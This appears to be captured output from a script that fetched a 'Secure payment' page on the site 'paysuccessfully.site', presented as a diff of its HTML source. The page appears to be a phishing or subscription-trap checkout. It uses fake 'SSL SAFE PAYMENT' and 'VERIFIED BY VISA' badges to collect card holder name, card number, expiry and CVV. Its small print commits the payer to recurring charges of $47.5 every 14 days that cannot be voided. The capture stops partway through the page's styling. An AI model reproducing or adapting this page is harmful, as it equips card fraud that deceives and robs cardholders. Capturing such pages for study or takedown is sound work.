@@ -1,0 +1,1189 @@
+/usr/local/lib/python3.11/dist-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'paysuccessfully.site'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
+  warnings.warn(
+source: <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/x-icon" href="favicon.ico">
+    <title>Secure payment</title>
+    <meta data-react-helmet="true" name="viewport" content="width=device-width, initial-scale=1">
+    <meta data-react-helmet="true" name="robots" content="noindex">
+    <meta data-react-helmet="true" name="title" content="Secure Checkout">
+    <meta data-react-helmet="true" name="description" content="">
+    <meta data-react-helmet="true" name="author" content="">
+    <meta data-react-helmet="true" name="keywords" content="">
+    <meta data-react-helmet="true" property="og:image" content="%BLOG_POST_IMAGE_URL%">
+    <meta data-react-helmet="true" property="og:image:alt" content="Secure Checkout">
+    <meta data-react-helmet="true" property="og:title" content="Secure Checkout">
+    <meta data-react-helmet="true" property="og:description" content="">
+    <script src="languages.js"></script>
+    <script>
+      function getURLParameter(name) {
+                return decodeURIComponent((new RegExp('[?|&]' + name + '=' + '([^&;]+?)(&|#|;|$)').exec(location.search) || [null, ''])[1].replace(/\+/g, '%20')) || null;
+            }
+      window.onload = function() {
+                applyTranslations(getLanguage());
+            }
+    </script>
+     <!-- Google Tag -->
+     <script async src="https://www.googletagmanager.com/gtag/js?id=G-P3SLZ22XQM"></script>
+     <script>
+       window.dataLayer = window.dataLayer || [];
+       function gtag(){dataLayer.push(arguments);}
+       gtag('js', new Date());
+     
+       gtag('config', 'G-P3SLZ22XQM');
+     </script>
+
+     <!-- Google Tag Manager -->
+     <script>
+       (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+       new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+       j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+       'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+       })(window,document,'script','dataLayer','GTM-NPMHLRZ8');
+     </script>
+     <!-- End Google Tag Manager -->
+</head>
+<body>
+    <div class="page">
+      <div class="over-header">
+        <p id="left-text">SSL SAFE PAYMENT</p>
+        <div class="header-cards">
+          <p id="right-text">VERIFIED BY VISA</p>
+          <div class="mini-cards">
+            <img id="mc" src="images/mastercard.png" />
+            <img id="visa" src="images/visa.jpg" />
+          </div>
+          
+        </div>
+        
+      </div>
+      <div class="container">
+            <div class="left">
+                <div class="left-header">
+                  <p id="info-text">1. Information</p>
+                  <hr />
+                  <p id="payment-text">2. Payment</p>
+                </div> 
+                <div size="12">
+                    <form id="userForm"  style="width: 100%;">
+                        <!-- <div class="location" onclick="showCountrySelect()">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="25" fill="currentColor">
+                              <path d="M12 2C8.13 2 5 5.13 5 9c0 4.42 5.33 9.58 6.17 10.41a1 1 0 0 0 1.66 0C13.67 18.58 19 13.42 19 9c0-3.87-3.13-7-7-7zm0 9a3.5 3.5 0 1 1 0-7 3.5 3.5 0 0 1 0 7z"/>
+                            </svg>
+                            <p id="location">Your location</p>
+                        </div> -->
+                        <div id="custom-select-container" class="custom-select-container" style="position:relative; flex-wrap: wrap; margin-bottom: 15px; padding: 0 20px">
+                            <div class="custom-select-button" onclick="toggleDropdown(this)">
+                              <span id="select" class="selected-option">Select an option</span>
+                              <i class="arrow"></i>
+                            </div>
+                            <div class="custom-select-dropdown">
+                                <div id="l1" class="custom-select-item" onclick="selectOption(this, 'Afghanistan')">Afghanistan</div>
+                                <div id="l2"  class="custom-select-item" onclick="selectOption(this, 'Albania')">Albania</div>
+                                <div id="l3" class="custom-select-item" onclick="selectOption(this, 'Algeria')">Algeria</div>
+                                <div id="l4" class="custom-select-item" onclick="selectOption(this, 'American Samoa')">American Samoa</div>
+                                <div id="l5" class="custom-select-item" onclick="selectOption(this, 'Andorra')">Andorra</div>
+                                <div id="l6" class="custom-select-item" onclick="selectOption(this, 'Angola')">Angola</div>
+                                <div id="l7" class="custom-select-item" onclick="selectOption(this, 'Anguilla')">Anguilla</div>
+                                <div id="l8" class="custom-select-item" onclick="selectOption(this, 'Antarctica')">Antarctica</div>
+                                <div id="l9" class="custom-select-item" onclick="selectOption(this, 'Antigua and Barbuda')">Antigua and Barbuda</div>
+                                <div id="l10" class="custom-select-item" onclick="selectOption(this, 'Argentina')">Argentina</div>
+                                <div id="l11" class="custom-select-item" onclick="selectOption(this, 'Armenia')">Armenia</div>
+                                <div id="l12" class="custom-select-item" onclick="selectOption(this, 'Aruba')">Aruba</div>
+                                <div id="l13" class="custom-select-item" onclick="selectOption(this, 'Australia')">Australia</div>
+                                <div id="l14" class="custom-select-item" onclick="selectOption(this, 'Austria')">Austria</div>
+                                <div id="l15" class="custom-select-item" onclick="selectOption(this, 'Azerbaijan')">Azerbaijan</div>
+                                <div id="l16" class="custom-select-item" onclick="selectOption(this, 'Bahamas')">Bahamas</div>
+                                <div id="l17" class="custom-select-item" onclick="selectOption(this, 'Bahrain')">Bahrain</div>
+                                <div id="l18" class="custom-select-item" onclick="selectOption(this, 'Bangladesh')">Bangladesh</div>
+                                <div id="l19" class="custom-select-item" onclick="selectOption(this, 'Barbados')">Barbados</div>
+                                <div id="l20" class="custom-select-item" onclick="selectOption(this, 'Belarus')">Belarus</div>
+                                <div id="l21" class="custom-select-item" onclick="selectOption(this, 'Belgium')">Belgium</div>
+                                <div id="l22" class="custom-select-item" onclick="selectOption(this, 'Belize')">Belize</div>
+                                <div id="l23" class="custom-select-item" onclick="selectOption(this, 'Benin')">Benin</div>
+                                <div id="l24" class="custom-select-item" onclick="selectOption(this, 'Bermuda')">Bermuda</div>
+                                <div id="l25" class="custom-select-item" onclick="selectOption(this, 'Bhutan')">Bhutan</div>
+                                <div id="l26" class="custom-select-item" onclick="selectOption(this, 'Bolivia')">Bolivia</div>
+                                <div id="l27" class="custom-select-item" onclick="selectOption(this, 'Bosnia and Herzegovina')">Bosnia and Herzegovina</div>
+                                <div id="l28" class="custom-select-item" onclick="selectOption(this, 'Botswana')">Botswana</div>
+                                <div id="l29" class="custom-select-item" onclick="selectOption(this, 'Brazil')">Brazil</div>
+                                <div id="l30" class="custom-select-item" onclick="selectOption(this, 'British Indian Ocean Territory')">British Indian Ocean Territory</div>
+                                <div id="l31" class="custom-select-item" onclick="selectOption(this, 'Brunei Darussalam')">Brunei Darussalam</div>
+                                <div id="l32" class="custom-select-item" onclick="selectOption(this, 'Bulgaria')">Bulgaria</div>
+                                <div id="l33" class="custom-select-item" onclick="selectOption(this, 'Burkina Faso')">Burkina Faso</div>
+                                <div id="l34" class="custom-select-item" onclick="selectOption(this, 'Burundi')">Burundi</div>
+                                <div id="l35" class="custom-select-item" onclick="selectOption(this, 'Cabo Verde')">Cabo Verde</div>
+                                <div id="l36" class="custom-select-item" onclick="selectOption(this, 'Cambodia')">Cambodia</div>
+                                <div id="l37" class="custom-select-item" onclick="selectOption(this, 'Cameroon')">Cameroon</div>
+                                <div id="l38" class="custom-select-item" onclick="selectOption(this, 'Canada')">Canada</div>
+                                <div id="l39" class="custom-select-item" onclick="selectOption(this, 'Cayman Islands')">Cayman Islands</div>
+                                <div id="l40" class="custom-select-item" onclick="selectOption(this, 'Central African Republic')">Central African Republic</div>
+                                <div id="l41" class="custom-select-item" onclick="selectOption(this, 'Chad')">Chad</div>
+                                <div id="l42" class="custom-select-item" onclick="selectOption(this, 'Chile')">Chile</div>
+                                <div id="l43" class="custom-select-item" onclick="selectOption(this, 'China')">China</div>
+                                <div id="l44" class="custom-select-item" onclick="selectOption(this, 'Colombia')">Colombia</div>
+                                <div id="l45" class="custom-select-item" onclick="selectOption(this, 'Comoros')">Comoros</div>
+                                <div id="l47" class="custom-select-item" onclick="selectOption(this, 'Congo')">Congo</div>
+                                <div id="l48" class="custom-select-item" onclick="selectOption(this, 'Costa Rica')">Costa Rica</div>
+                                <div id="l50" class="custom-select-item" onclick="selectOption(this, 'Croatia')">Croatia</div>
+                                <div id="l51" class="custom-select-item" onclick="selectOption(this, 'Cuba')">Cuba</div>
+                                <div id="l52" class="custom-select-item" onclick="selectOption(this, 'CuraÃ§ao')">CuraÃ§ao</div>
+                                <div id="l53" class="custom-select-item" onclick="selectOption(this, 'Cyprus')">Cyprus</div>
+                                <div id="l54" class="custom-select-item" onclick="selectOption(this, 'Czech Republic')">Czech Republic</div>
+                                <div id="l55" class="custom-select-item" onclick="selectOption(this, 'Denmark')">Denmark</div>
+                                <div id="l56" class="custom-select-item" onclick="selectOption(this, 'Djibouti')">Djibouti</div>
+                                <div id="l57" class="custom-select-item" onclick="selectOption(this, 'Dominica')">Dominica</div>
+                                <div id="l58" class="custom-select-item" onclick="selectOption(this, 'Dominican Republic')">Dominican Republic</div>
+                                <div id="l59" class="custom-select-item" onclick="selectOption(this, 'Ecuador')">Ecuador</div>
+                                <div id="l60" class="custom-select-item" onclick="selectOption(this, 'Egypt')">Egypt</div>
+                                <div id="l61" class="custom-select-item" onclick="selectOption(this, 'El Salvador')">El Salvador</div>
+                                <div id="l62" class="custom-select-item" onclick="selectOption(this, 'Equatorial Guinea')">Equatorial Guinea</div>
+                                <div id="l63" class="custom-select-item" onclick="selectOption(this, 'Eritrea')">Eritrea</div>
+                                <div id="l64" class="custom-select-item" onclick="selectOption(this, 'Estonia')">Estonia</div>
+                                <div id="l65" class="custom-select-item" onclick="selectOption(this, 'Ethiopia')">Ethiopia</div>
+                                <div id="l66" class="custom-select-item" onclick="selectOption(this, 'Fiji')">Fiji</div>
+                                <div id="l67" class="custom-select-item" onclick="selectOption(this, 'Finland')">Finland</div>
+                                <div id="l68" class="custom-select-item" onclick="selectOption(this, 'France')">France</div>
+                                <div id="l69" class="custom-select-item" onclick="selectOption(this, 'Gabon')">Gabon</div>
+                                <div id="l70" class="custom-select-item" onclick="selectOption(this, 'Gambia')">Gambia</div>
+                                <div id="l71" class="custom-select-item" onclick="selectOption(this, 'Georgia')">Georgia</div>
+                                <div id="l72" class="custom-select-item" onclick="selectOption(this, 'Germany')">Germany</div>
+                                <div id="l73" class="custom-select-item" onclick="selectOption(this, 'Ghana')">Ghana</div>
+                                <div id="l74" class="custom-select-item" onclick="selectOption(this, 'Greece')">Greece</div>
+                                <div id="l75" class="custom-select-item" onclick="selectOption(this, 'Greenland')">Greenland</div>
+                                <div id="l76" class="custom-select-item" onclick="selectOption(this, 'Grenada')">Grenada</div>
+                                <div id="l77" class="custom-select-item" onclick="selectOption(this, 'Guam')">Guam</div>
+                                <div id="l78" class="custom-select-item" onclick="selectOption(this, 'Guatemala')">Guatemala</div>
+                                <div id="l79" class="custom-select-item" onclick="selectOption(this, 'Guinea')">Guinea</div>
+                                <div id="l80" class="custom-select-item" onclick="selectOption(this, 'Guinea-Bissau')">Guinea-Bissau</div>
+                                <div id="l81" class="custom-select-item" onclick="selectOption(this, 'Guyana')">Guyana</div>
+                                <div id="l82" class="custom-select-item" onclick="selectOption(this, 'Haiti')">Haiti</div>
+                                <div id="l83" class="custom-select-item" onclick="selectOption(this, 'Honduras')">Honduras</div>
+                                <div id="l84" class="custom-select-item" onclick="selectOption(this, 'Hong Kong')">Hong Kong</div>
+                                <div id="l85" class="custom-select-item" onclick="selectOption(this, 'Hungary')">Hungary</div>
+                                <div id="l86" class="custom-select-item" onclick="selectOption(this, 'Iceland')">Iceland</div>
+                                <div id="l87" class="custom-select-item" onclick="selectOption(this, 'India')">India</div>
+                                <div id="l88" class="custom-select-item" onclick="selectOption(this, 'Indonesia')">Indonesia</div>
+                                <div id="l89" class="custom-select-item" onclick="selectOption(this, 'Iran')">Iran</div>
+                                <div id="l90" class="custom-select-item" onclick="selectOption(this, 'Iraq')">Iraq</div>
+                                <div id="l91" class="custom-select-item" onclick="selectOption(this, 'Ireland')">Ireland</div>
+                                <div id="l92" class="custom-select-item" onclick="selectOption(this, 'Israel')">Israel</div>
+                                <div id="l93" class="custom-select-item" onclick="selectOption(this, 'Italy')">Italy</div>
+                                <div id="l94" class="custom-select-item" onclick="selectOption(this, 'Jamaica')">Jamaica</div>
+                                <div id="l95" class="custom-select-item" onclick="selectOption(this, 'Japan')">Japan</div>
+                                <div id="l96" class="custom-select-item" onclick="selectOption(this, 'Jordan')">Jordan</div>
+                                <div id="l97" class="custom-select-item" onclick="selectOption(this, 'Kazakhstan')">Kazakhstan</div>
+                                <div id="l98" class="custom-select-item" onclick="selectOption(this, 'Kenya')">Kenya</div>
+                                <div id="l99" class="custom-select-item" onclick="selectOption(this, 'Kiribati')">Kiribati</div>
+                                <div id="l100" class="custom-select-item" onclick="selectOption(this, 'Korea (South)')">Korea (South)</div>
+                                <div id="l101" class="custom-select-item" onclick="selectOption(this, 'Kuwait')">Kuwait</div>
+                                <div id="l102" class="custom-select-item" onclick="selectOption(this, 'Kyrgyzstan')">Kyrgyzstan</div>
+                                <div id="l103" class="custom-select-item" onclick="selectOption(this, 'Laos')">Laos</div>
+                                <div id="l104" class="custom-select-item" onclick="selectOption(this, 'Latvia')">Latvia</div>
+                                <div id="l105" class="custom-select-item" onclick="selectOption(this, 'Lebanon')">Lebanon</div>
+                                <div id="l106" class="custom-select-item" onclick="selectOption(this, 'Lesotho')">Lesotho</div>
+                                <div id="l107" class="custom-select-item" onclick="selectOption(this, 'Liberia')">Liberia</div>
+                                <div id="l108" class="custom-select-item" onclick="selectOption(this, 'Libya')">Libya</div>
+                                <div id="l109" class="custom-select-item" onclick="selectOption(this, 'Liechtenstein')">Liechtenstein</div>
+                                <div id="l110" class="custom-select-item" onclick="selectOption(this, 'Lithuania')">Lithuania</div>
+                                <div id="l111" class="custom-select-item" onclick="selectOption(this, 'Luxembourg')">Luxembourg</div>
+                                <div id="l112" class="custom-select-item" onclick="selectOption(this, 'Macao')">Macao</div>
+                                <div id="l113" class="custom-select-item" onclick="selectOption(this, 'Madagascar')">Madagascar</div>
+                                <div id="l114" class="custom-select-item" onclick="selectOption(this, 'Malawi')">Malawi</div>
+                                <div id="l115" class="custom-select-item" onclick="selectOption(this, 'Malaysia')">Malaysia</div>
+                                <div id="l116" class="custom-select-item" onclick="selectOption(this, 'Maldives')">Maldives</div>
+                                <div id="l117" class="custom-select-item" onclick="selectOption(this, 'Mali')">Mali</div>
+                                <div id="l118" class="custom-select-item" onclick="selectOption(this, 'Malta')">Malta</div>
+                                <div id="l119" class="custom-select-item" onclick="selectOption(this, 'Marshall Islands')">Marshall Islands</div>
+                                <div id="l120" class="custom-select-item" onclick="selectOption(this, 'Mauritania')">Mauritania</div>
+                                <div id="l121" class="custom-select-item" onclick="selectOption(this, 'Mauritius')">Mauritius</div>
+                                <div id="l122" class="custom-select-item" onclick="selectOption(this, 'Mexico')">Mexico</div>
+                                <div id="l123" class="custom-select-item" onclick="selectOption(this, 'Micronesia')">Micronesia</div>
+                                <div id="l124" class="custom-select-item" onclick="selectOption(this, 'Moldova')">Moldova</div>
+                                <div id="l125" class="custom-select-item" onclick="selectOption(this, 'Monaco')">Monaco</div>
+                                <div id="l126" class="custom-select-item" onclick="selectOption(this, 'Mongolia')">Mongolia</div>
+                                <div id="l127" class="custom-select-item" onclick="selectOption(this, 'Montenegro')">Montenegro</div>
+                                <div id="l128" class="custom-select-item" onclick="selectOption(this, 'Morocco')">Morocco</div>
+                                <div id="l129" class="custom-select-item" onclick="selectOption(this, 'Mozambique')">Mozambique</div>
+                                <div id="l130" class="custom-select-item" onclick="selectOption(this, 'Myanmar')">Myanmar</div>
+                                <div id="l131" class="custom-select-item" onclick="selectOption(this, 'Namibia')">Namibia</div>
+                                <div id="l132" class="custom-select-item" onclick="selectOption(this, 'Nauru')">Nauru</div>
+                                <div id="l133" class="custom-select-item" onclick="selectOption(this, 'Nepal')">Nepal</div>
+                                <div id="l134" class="custom-select-item" onclick="selectOption(this, 'Netherlands')">Netherlands</div>
+                                <div id="l135" class="custom-select-item" onclick="selectOption(this, 'New Zealand')">New Zealand</div>
+                                <div id="l136" class="custom-select-item" onclick="selectOption(this, 'Nicaragua')">Nicaragua</div>
+                                <div id="l138" class="custom-select-item" onclick="selectOption(this, 'Nigeria')">Nigeria</div>
+                                <div id="l141" class="custom-select-item" onclick="selectOption(this, 'Norway')">Norway</div>
+                                <div id="l142" class="custom-select-item" onclick="selectOption(this, 'Oman')">Oman</div>
+                                <div id="l143" class="custom-select-item" onclick="selectOption(this, 'Pakistan')">Pakistan</div>
+                                <div id="l144" class="custom-select-item" onclick="selectOption(this, 'Palau')">Palau</div>
+                                <div id="l145" class="custom-select-item" onclick="selectOption(this, 'Palestine')">Palestine</div>
+                                <div id="l146" class="custom-select-item" onclick="selectOption(this, 'Panama')">Panama</div>
+                                <div id="l147" class="custom-select-item" onclick="selectOption(this, 'Papua New Guinea')">Papua New Guinea</div>
+                                <div id="l148" class="custom-select-item" onclick="selectOption(this, 'Paraguay')">Paraguay</div>
+                                <div id="l149" class="custom-select-item" onclick="selectOption(this, 'Peru')">Peru</div>
+                                <div id="l150" class="custom-select-item" onclick="selectOption(this, 'Philippines')">Philippines</div>
+                                <div id="l151" class="custom-select-item" onclick="selectOption(this, 'Poland')">Poland</div>
+                                <div id="l152" class="custom-select-item" onclick="selectOption(this, 'Portugal')">Portugal</div>
+                                <div id="l153" class="custom-select-item" onclick="selectOption(this, 'Puerto Rico')">Puerto Rico</div>
+                                <div id="l154" class="custom-select-item" onclick="selectOption(this, 'Qatar')">Qatar</div>
+                                <div id="l155" class="custom-select-item" onclick="selectOption(this, 'Romania')">Romania</div>
+                                <div id="l156" class="custom-select-item" onclick="selectOption(this, 'Russia')">Russia</div>
+                                <div id="l157" class="custom-select-item" onclick="selectOption(this, 'Rwanda')">Rwanda</div>
+                                <div id="l158" class="custom-select-item" onclick="selectOption(this, 'Samoa')">Samoa</div>
+                                <div id="l159" class="custom-select-item" onclick="selectOption(this, 'San Marino')">San Marino</div>
+                                <div id="l160" class="custom-select-item" onclick="selectOption(this, 'Sao Tome and Principe')">Sao Tome and Principe</div>
+                                <div id="l161" class="custom-select-item" onclick="selectOption(this, 'Saudi Arabia')">Saudi Arabia</div>
+                                <div id="l162" class="custom-select-item" onclick="selectOption(this, 'Senegal')">Senegal</div>
+                                <div id="l163" class="custom-select-item" onclick="selectOption(this, 'Serbia')">Serbia</div>
+                                <div id="l164" class="custom-select-item" onclick="selectOption(this, 'Seychelles')">Seychelles</div>
+                                <div id="l165" class="custom-select-item" onclick="selectOption(this, 'Sierra Leone')">Sierra Leone</div>
+                                <div id="l166" class="custom-select-item" onclick="selectOption(this, 'Singapore')">Singapore</div>
+                                <div id="l167" class="custom-select-item" onclick="selectOption(this, 'Slovakia')">Slovakia</div>
+                                <div id="l168" class="custom-select-item" onclick="selectOption(this, 'Slovenia')">Slovenia</div>
+                                <div id="l169" class="custom-select-item" onclick="selectOption(this, 'Solomon Islands')">Solomon Islands</div>
+                                <div id="l170" class="custom-select-item" onclick="selectOption(this, 'Somalia')">Somalia</div>
+                                <div id="l171" class="custom-select-item" onclick="selectOption(this, 'South Africa')">South Africa</div>
+                                <div id="l172" class="custom-select-item" onclick="selectOption(this, 'Spain')">Spain</div>
+                                <div id="l173" class="custom-select-item" onclick="selectOption(this, 'Sri Lanka')">Sri Lanka</div>
+                                <div id="l174" class="custom-select-item" onclick="selectOption(this, 'Sudan')">Sudan</div>
+                                <div id="l175" class="custom-select-item" onclick="selectOption(this, 'Suriname')">Suriname</div>
+                                <div id="l176" class="custom-select-item" onclick="selectOption(this, 'Sweden')">Sweden</div>
+                                <div id="l177" class="custom-select-item" onclick="selectOption(this, 'Switzerland')">Switzerland</div>
+                                <div id="l178" class="custom-select-item" onclick="selectOption(this, 'Syria')">Syria</div>
+                                <div id="l179" class="custom-select-item" onclick="selectOption(this, 'Taiwan')">Taiwan</div>
+                                <div id="l180" class="custom-select-item" onclick="selectOption(this, 'Tajikistan')">Tajikistan</div>
+                                <div id="l181" class="custom-select-item" onclick="selectOption(this, 'Tanzania')">Tanzania</div>
+                                <div id="l182" class="custom-select-item" onclick="selectOption(this, 'Thailand')">Thailand</div>
+                                <div id="l183" class="custom-select-item" onclick="selectOption(this, 'Timor-Leste')">Timor-Leste</div>
+                                <div id="l184" class="custom-select-item" onclick="selectOption(this, 'Togo')">Togo</div>
+                                <div id="l185" class="custom-select-item" onclick="selectOption(this, 'Tonga')">Tonga</div>
+                                <div id="l186" class="custom-select-item" onclick="selectOption(this, 'Trinidad and Tobago')">Trinidad and Tobago</div>
+                                <div id="l187" class="custom-select-item" onclick="selectOption(this, 'Tunisia')">Tunisia</div>
+                                <div id="l188" class="custom-select-item" onclick="selectOption(this, 'Turkey')">Turkey</div>
+                                <div id="l189" class="custom-select-item" onclick="selectOption(this, 'Turkmenistan')">Turkmenistan</div>
+                                <div id="l190" class="custom-select-item" onclick="selectOption(this, 'Tuvalu')">Tuvalu</div>
+                                <div id="l191" class="custom-select-item" onclick="selectOption(this, 'Uganda')">Uganda</div>
+                                <div id="l192" class="custom-select-item" onclick="selectOption(this, 'Ukraine')">Ukraine</div>
+                                <div id="l193" class="custom-select-item" onclick="selectOption(this, 'United Arab Emirates')">United Arab Emirates</div>
+                                <div id="l194" class="custom-select-item" onclick="selectOption(this, 'United Kingdom')">United Kingdom</div>
+                                <div id="l195" class="custom-select-item" onclick="selectOption(this, 'United States')">United States</div>
+                                <div id="l196" class="custom-select-item" onclick="selectOption(this, 'Uruguay')">Uruguay</div>
+                                <div id="l197" class="custom-select-item" onclick="selectOption(this, 'Uzbekistan')">Uzbekistan</div>
+                                <div id="l198" class="custom-select-item" onclick="selectOption(this, 'Vanuatu')">Vanuatu</div>
+                                <div id="l199" class="custom-select-item" onclick="selectOption(this, 'Venezuela')">Venezuela</div>
+                                <div id="l200" class="custom-select-item" onclick="selectOption(this, 'Vietnam')">Vietnam</div>
+                                <div id="l201" class="custom-select-item" onclick="selectOption(this, 'Yemen')">Yemen</div>
+                                <div id="l202" class="custom-select-item" onclick="selectOption(this, 'Zambia')">Zambia</div>
+                                <div id="l203" class="custom-select-item" onclick="selectOption(this, 'Zimbabwe')">Zimbabwe</div>                                
+                            </div>
+                        </div>
+
+                        <div style="position:relative; display: flex; flex-wrap: wrap; margin-bottom: 10px; padding: 0 20px">
+                          <label id="laber-holder" for="card-holder">Card Holder</label>
+                          <input type="text" id="card-holder" placeholder="Card Holder"> 
+                          <p class="error-message" id="holder-error-message">Invalid credit card holder</p>
+                        </div>
+
+                        <div style="position:relative; display: flex; flex-wrap: wrap; margin-bottom: 10px; padding: 0 20px">
+                            <label id="label-number" for="card-number">Card number</label>
+                            <input type="text" id="card-number" name="cardnumber" placeholder="Card Number" maxlength="19">
+                            <img src="images/credit-card.png" id="card-icon" class="card-icon" alt="Card Icon">
+                            <p class="error-message" id="error-message">Invalid credit card number</p>
+                        </div>
+
+                        <div style="padding: 0 20px; margin-bottom: 10px;">
+                            <label id="label-date">Expiration Date</label>
+                            <div id="exp-box">
+                            <div id="exp-month" class="custom-select-container" style="position:relative; flex-wrap: wrap; margin-bottom: 10px; padding: 0 20px">
+                                    <div class="custom-select-button" onclick="toggleDropdown(this)">
+                                      <span id="select-m" class="selected-option">MM</span>
+                                      <i class="arrow"></i>
+                                    </div>
+                                    <div class="custom-select-dropdown">
+                                        <div class="custom-select-item" onclick="selectOption(this, '01')">01</div>
+                                        <div class="custom-select-item" onclick="selectOption(this, '02')">02</div>
+                                        <div class="custom-select-item" onclick="selectOption(this, '03')">03</div>
+                                        <div class="custom-select-item" onclick="selectOption(this, '04')">04</div>
+                                        <div class="custom-select-item" onclick="selectOption(this, '05')">05</div>
+                                        <div class="custom-select-item" onclick="selectOption(this, '06')">06</div>
+                                        <div class="custom-select-item" onclick="selectOption(this, '07')">07</div>
+                                        <div class="custom-select-item" onclick="selectOption(this, '08')">08</div>
+                                        <div class="custom-select-item" onclick="selectOption(this, '09')">09</div>
+                                        <div class="custom-select-item" onclick="selectOption(this, '10')">10</div>
+                                        <div class="custom-select-item" onclick="selectOption(this, '11')">11</div>
+                                        <div class="custom-select-item" onclick="selectOption(this, '12')">12</div>
+                                    </div>
+                            </div>
+                            <div id="exp-year" class="custom-select-container" style="position:relative; flex-wrap: wrap; margin-bottom: 10px; padding: 0 20px">
+                                    <div class="custom-select-button" onclick="toggleDropdown(this)">
+                                      <span id="select-y" class="selected-option">YY</span>
+                                      <i class="arrow"></i>
+                                    </div>
+                                    <div  class="custom-select-dropdown">
+                                        <div class="custom-select-item" onclick="selectOption(this, '24')">24</div>
+                                        <div class="custom-select-item" onclick="selectOption(this, '25')">25</div>
+                                        <div class="custom-select-item" onclick="selectOption(this, '26')">26</div>
+                                        <div class="custom-select-item" onclick="selectOption(this, '27')">27</div>
+                                        <div class="custom-select-item" onclick="selectOption(this, '28')">28</div>
+                                        <div class="custom-select-item" onclick="selectOption(this, '29')">29</div>
+                                        <div class="custom-select-item" onclick="selectOption(this, '30')">30</div>
+                                        <div class="custom-select-item" onclick="selectOption(this, '31')">31</div>
+                                        <div class="custom-select-item" onclick="selectOption(this, '32')">32</div>
+                                        <div class="custom-select-item" onclick="selectOption(this, '33')">33</div>
+                                        <div class="custom-select-item" onclick="selectOption(this, '34')">34</div>
+                                     </div>
+                            </div>
+                            </div>
+                            <p class="error-message" id="exp-error-message">Invalid expiration date</p>  
+                       </div>
+                       
+                        <div style="position:relative; display: flex; flex-wrap: wrap; margin-bottom: 10px; padding: 0 20px">
+                            <label id="label-cvv" for="card-holder">CVV</label>
+                            <input type="text" id="cvv" placeholder="CVV"> 
+                            <img src="images/icon-cvv.svg" id="cvv-icon" class="cvv-icon" alt="CVV Icon" maxlength="4">
+                            <p class="error-message" id="cvv-error-message">Invalid CVV</p>
+                        </div>
+                        <div class="cards">
+                            <img src="images/visa.svg" />
+                            <img src="images/mastercard.svg" />
+                        </div>
+                        <!-- <label class="checkbox-container">
+                            <input type="checkbox" id="myCheckbox">
+                            <span class="checkbox-custom"></span>
+                            <p id="checkbox-text">
+                              I agree to the above conditions and the <span style="color: #00c0ff;">Terms of Use</span>  and the <span style="color: #00c0ff;">Privacy Policy.</span>
+                              You have to agree with our Terms of Use.
+                            </p>
+                        </label> -->
+                        <div style="padding: 0 20px; margin-top: 15px;">
+                            <button id="submit">
+                                PAY NOW
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+    
+
+            <div class="right">
+              <div class="price-container">
+                <p id="order-text">Order Summary:</p>
+                <hr/>
+                <p id="price-text"></p>
+              </div>
+              <div class="pictures">
+                <img src="images/del1.png" alt="badje1" />
+                <img src="images/del2.png" alt="badje2" />
+                <img src="images/del3.png" alt="badje3" />
+              </div>
+              <div class="last-block">
+                <p id="question">
+                  Why am I asked for my credit card details?
+                </p>
+                <p id="answer">
+                  We provide our services not only with responsibility, but also with great joy and excitement. We strive to satisfy our customers and take pride in providing the best service. We assure that our service is delivered on time and we get the best from our customers.
+                  We offer new users the opportunity to access our vast audiobook platform. This special offer gives you the opportunity to become a member and try full access for 2 days at minimum or no charge. After this period, you will become a full member signed up for automatic recurring payment every 14 days at the then current rate ($47.5), Don't worry! We remind you three days before each top-up and you can end your membership at any point, at no charge.
+                  Once a payment has been processed, it cannot be voided. Your membership services will be available immediately until canceled. You may cancel your membership at any time by accessing your membership account or contacting our customer service representatives via email or live chat. As a valued member you'll enjoy exciusive members-only pricing and dedicated promotions.
+                  We evaluate the behavior of the customer's account when using the contracted services and reserves the right to withdraw or change the contracted subscription at our sole discretion without notice to guarantee the quality at the services of this website.
+                </p>
+              </div>
+            </div>
+      </div>  
+      
+    </div>
+
+
+    <style>
+        html, body {
+            height: auto;
+            overflow-y: auto;
+            margin: 0;
+        }
+
+        .page {
+            width: 100%;
+            background-color: white;
+            height: auto;
+          
+
+        }
+        .over-header {
+          padding: 10px 20px;
+          background-color: #000;
+          display: flex;
+          align-items: center;
+          justify-content: space-between;
+        }
+        .header-cards {
+          display: flex;
+          align-items: center;
+          gap: 5px;
+        }
+        .price-container {
+          padding: 9px 30px 0;
+        }
+        #order-text {
+          font-family: Open Sans, Arial, sans-serif !important;
+          font-size: 20px;
+          font-weight: 600;
+        }
+        #price-text {
+          font-family: Open Sans, Arial, sans-serif !important;
+          font-size: 25px;
+          font-weight: 700;
+        }
+        #left-text,
+        #right-text {
+          color: white;
+          font-family: Open Sans, Arial, sans-serif !important;
+          font-size: 12px;
+          margin: 0;
+        }
+        .mini-cards {
+          height: 15px;
+          display: flex;
+          align-items: center;
+          gap: 5px;
+        }
+        .mini-cards img {
+          height: 100%;
+          width: auto;
+        }
+        .container {
+            display: flex;
+            gap: 30px;
+            justify-content: center;
+            max-width: 1170px; 
+            margin: 0 auto;
+            flex-wrap: wrap; 
+            padding: 25px 0;
+        }
+
+        .left, .right {
+            width: 555px;
+            background-color: #fff;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .left-header {
+          padding: 20px;
+        }
+        
+        #info-text,
+        #payment-text {
+          font-family: Open Sans, Arial, sans-serif !important;
+          font-size: 16px;
+          font-weight: 700;
+        }
+        
+        .activation {
+          display: flex;
+          align-items: center;
+          justify-content: space-between;
+          height: 28px;
+        }
+        
+        #title {
+          color: #071f2f;
+          font-size: 20px;
+          font-weight: 700;
+          font-family: Open Sans, Arial, sans-serif !important;
+        }
+        
+        #price {
+          color: #198753;
+          font-size: 20px;
+          font-weight: bold;
+          line-height: 24px;
+          font-family: Open Sans, Arial, sans-serif !important;
+        }
+        
